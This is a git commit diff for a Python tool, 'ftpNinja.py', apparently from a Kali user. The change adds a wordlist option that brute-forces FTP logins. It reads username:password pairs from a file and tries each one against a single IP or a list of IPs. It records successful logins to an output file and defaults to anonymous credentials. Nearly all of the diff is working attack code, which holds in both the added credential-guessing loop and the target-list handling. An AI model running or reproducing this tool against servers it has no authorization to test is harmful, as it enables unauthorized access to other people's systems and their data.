9eba2128f44615e9f4fb8de0c45800d1680b07e5
kali <kali@localhost.localdomain>
2023-08-09 16:38:43 +0100

    added wordlist option

--- ftpNinja.py
+++ ftpNinja.py
@@ -21,6 +21,15 @@ def logo():
     print("\033[0m")
 
 
+def parse_credentials_file(credentials_file):
+    credentials = []
+    with open(credentials_file, 'r') as file:
+        for line in file:
+            parts = line.strip().split(':')
+            if len(parts) == 2:
+                username, password = parts[0], parts[1]
+                credentials.append((username, password))
+    return credentials
 
 def is_valid_ip(ip):
     try:
@@ -29,111 +38,115 @@ def is_valid_ip(ip):
     except socket.error:
         return False
 
-
-def get_status_from_exception(exception):
-    pattern = r"\b(\d{3})\b"
-    match = re.search(pattern, str(exception))
-    if match:
-        return match.group()
-    else:
-        return ""
-
-
 def is_valid_ftp_ip(ip, timeout=3):
     try:
         socket.setdefaulttimeout(timeout)
-        with ftplib.FTP(ip) as ftp:
-            return True
-    except ftplib.error_perm as e:
-        if "No connections allowed from your IP" in str(e):
-            return "NOT_ALLOWED"
-        else:
-            raise
+        with socket.create_connection((ip, 21), timeout=timeout) as sock:
+            response = sock.recv(1024).decode()
+            if '220' in response:
+                return True
     except (socket.timeout, socket.error):
-        return False
+        pass
+    return False
+
+def connect_ftp(ip, output_file, credentials):
+    if not is_valid_ip(ip):
+        print(f"Invalid IP: \033[38;5;196m{ip}\033[0m Address")
+        return
+    if not is_valid_ftp_ip(ip):
+        print(f"Invalid FTP IP: \033[38;5;196m{ip}\033[0m Address")
+        return
+
+    for username, password in credentials:
+        print(f"\033[38;5;39mFTP login for IP: {ip}\033[0m")
+        print(f"\033[38;5;33mBrute Force Username: {username}, Password: {password}\033[0m")
+        try:
+            with ftplib.FTP(ip, timeout=3) as ftp:
+                try:
+                    ftp.login(username, password)
+                    print(f" \033[0;32mSuccessfully logged in to IP:{ip} \033[0m Username: \033[38;5;39m{username}\033[0m, Password: \033[38;5;39m{password}\033[0m")
+                    if output_file:
+                        output_file.write(f"Successfully logged in to IP: {ip} Username: {username}, Password: {password}\n")
+                    break
+                except ftplib.error_perm as e:
+                    error_message = str(e)
+                    if "530" in error_message:
+                        print(f" \033[38;5;203mLogin failed: Incorrect credentials\033[0m")
+                    else:
+                        print(f" \033[38;5;203mError connecting to {ip}: {error_message}\033[0m")
+        except socket.timeout:
+            print(f" \033[38;5;203mError connecting to {ip}: Connection timed out\033[0m")
+        except (socket.error, Exception) as e:
+            print(f" \033[38;5;203mError connecting to {ip}: {str(e)}\033[0m")
+            if output_file:
+                output_file.write(f"An unexpected error occurred while connecting to {ip}: {str(e)}\n")
 
 
-def connect_ftp(ip, output_file):
-    try:
-        if not is_valid_ip(ip):
-            print(f" Invalid IP: \033[38;5;196m{ip}\033[0m Address")
-            return
-        elif not is_valid_ftp_ip(ip):
-            print(f" Invalid FTP IP: \033[38;5;196m{ip}\033[0m Address")
-            return
-        elif is_valid_ftp_ip(ip) == "NOT_ALLOWED":
-            print(f" Error connecting to {ip}: [\033[38;5;203m550\033[0m] No connections allowed from your IP")
-            return
-
-        with ftplib.FTP(ip) as ftp:
-            ftp.login()
-        print(f" Successfully logged in to IP: {ip} \033[38;5;82m[200]\033[0m \033[38;5;111mLogin Success\033[0m")
-        if output_file is not None:
-            output_file.write(f" Successfully logged in to IP: {ip}\n")
-    except ftplib.error_perm as e:
-        status = get_status_from_exception(e)
-        if status:
-            print(f" Error connecting to {ip}: [\033[38;5;203m{status}\033[0m] \033[91m{str(e)[len(status)+1:]}\033[0m")
-    except (socket.timeout, socket.error):
-        print(f" Error connecting to {ip}: \033[38;5;203mConnection timed out or socket error\033[0m")
-    except Exception as e:
-        status = get_status_from_exception(e)
-        if status:
-            print(f" Error connecting to {ip}: [\033[38;5;203m{status}\033[0m] \033[91m{str(e)[len(status)+1:]}\033[0m")
-        if output_file is not None:
-            output_file.write(f" An unexpected error occurred while connecting to {ip}: {str(e)}\n")
 
 
-def process_ips(ip_list, output_file):
+def process_ips(ip_list, output_file, credentials):
+    def signal_handler(sig, frame):
+        print("\n\033[48;2;255;0;0m\033[38;2;255;255;255mCanceled by user.\033[0m")
+        if output_file:
+            output_file.close()
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+
     for ip in ip_list:
-        connect_ftp(ip, output_file)
-
-parser = argparse.ArgumentParser(description='FTP Tool')
-parser.add_argument('-l', '--list', metavar='ipList.txt', help='File containing a list of IP addresses')
-parser.add_argument('-d', '--single-ip', metavar='IP', help='Single IP address')
-parser.add_argument('-o', '--output', metavar='output.txt', type=str, help='Output file')
-
-
-def parse_arguments():
-    args = parser.parse_args()
-    ip_list = []
-    if args.list:
-        with open(args.list, 'r') as ip_file:
-            ip_list = [line.strip() for line in ip_file if is_valid_ip(line.strip())]
-    elif not sys.stdin.isatty():
-        ip_list = [line.strip() for line in sys.stdin if is_valid_ip(line.strip())]
-    if args.single_ip:
-        ip_list.append(args.single_ip)
-    return args, ip_list
+        connect_ftp(ip, output_file, credentials)
 
 def main():
-    args, ip_list = parse_arguments()
+    parser = argparse.ArgumentParser(description='FTP Tool')
+    parser.add_argument('-l', '--list', metavar='ipList.txt', help='File containing a list of IP addresses')
+    parser.add_argument('-ip', '--single-ip', metavar='IP', help='Single IP address')
+    parser.add_argument('-w', '--wordlist', metavar='wordlist.txt', help='File containing usernames and passwords separated by ":"')
+    parser.add_argument('-o', '--output', metavar='output.txt', type=str, help='Output file')
+
+    args = parser.parse_args()
+    ip_list = []
+
     if args.list:
-        print(f" \033[0;33mIP_List: {args.list}\033[0m")
         with open(args.list, 'r') as ip_file:
-            lines = sum(1 for _ in ip_file)
-        print(f" \033[0;36mSize: {lines} IP lines\033[0m")
-    elif not sys.stdin.isatty():
-        print(f" \033[0;33mIP_List: {args.list}\033[0m")
-        lines = sum(1 for _ in sys.stdin)
-        print(f" \033[0;36mSize: {lines} IP lines\033[0m")
+            ip_list += [line.strip() for line in ip_file if is_valid_ip(line.strip())]
+
+    if args.single_ip:
+        ip_list.append(args.single_ip)
+
+    if not args.list and not args.single_ip and not sys.stdin.isatty():
+        ip_list += [line.strip() for line in sys.stdin if is_valid_ip(line.strip())]
+
+    credentials_file = args.wordlist
+    credentials = None
+
+    if credentials_file:
+        credentials = parse_credentials_file(credentials_file)
+
+    if credentials is None:
+        credentials = [("anonymous", "anonymous")]
+
     output_file = None
     if args.output:
+        if os.path.exists(args.output):
+            print(f"Output file '{args.output}' already exists. Please choose a different file.")
+            sys.exit(1)
         output_file = open(args.output, 'w')
-    if not sys.stdin.isatty() or args.list or args.single_ip:
-        print(f" \033[0;32m[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting...\033[0m")
 
-        try:
-            process_ips(ip_list, output_file)
-        except KeyboardInterrupt:
-            print("\n\033[48;2;255;0;0m\033[38;2;255;255;255mCanceled by user.\033[0m")
-    else:
+    if not ip_list:
+        print("No valid IP addresses provided.")
         parser.print_help()
+        sys.exit(1)
+
+    print(f" \033[0;32m[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting...\033[0m")
+
+    try:
+        process_ips(ip_list, output_file, credentials)
+    except KeyboardInterrupt:
+        print("\n\033[48;2;255;0;0m\033[38;2;255;255;255mCanceled by user.\033[0m")
+
     if output_file:
         output_file.close()
 
 if __name__ == '__main__':
     logo()
     main()
-
-
